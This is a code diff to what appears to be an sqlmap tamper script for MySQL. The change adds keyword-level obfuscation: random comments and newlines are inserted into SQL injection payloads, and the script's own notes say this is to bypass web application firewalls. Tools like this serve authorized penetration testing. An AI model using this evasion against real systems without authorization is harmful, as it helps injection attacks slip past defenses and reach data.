@@ -8,17 +8,20 @@ See the file 'doc/COPYING' for copying permission
 """
 
 import os
+import re
 import random
 import string
 
 from lib.core.common import singleTimeWarnMessage
+from lib.core.data import kb
 from lib.core.enums import DBMS
 from lib.core.enums import PRIORITY
+from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS
 
 __priority__ = PRIORITY.LOW
 
 def dependencies():
-    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__)[:-3], DBMS.MYSQL))
+    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s > 5.1.13" % (os.path.basename(__file__)[:-3], DBMS.MYSQL))
 
 def tamper(payload):
     """
@@ -30,18 +33,29 @@ def tamper(payload):
         * Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227
 
     Requirement:
-        * MySQL
+        * MySQL >= 5.1.13
 
     Tested against:
-        * MySQL 4.0, 5.0
+        * MySQL 5.1.41
 
     Notes:
         * Useful to bypass several web application firewalls
     """
 
-    retVal = ""
+    def process(match):
+        word = match.group('word')
+        randomStr = ''.join(random.choice(string.ascii_uppercase + string.lowercase) for x in range(random.randint(6, 12)))
+
+        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
+            return match.group().replace(word, "%s%%23%s%%0A" % (word, randomStr))
+        else:
+            return match.group()
+
+    retVal = "" 
 
     if payload:
+        payload = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", lambda match: process(match), payload)
+
         for i in xrange(len(payload)):
             if payload[i].isspace():
                 randomStr = ''.join(random.choice(string.ascii_uppercase + string.lowercase) for x in range(random.randint(6, 12)))
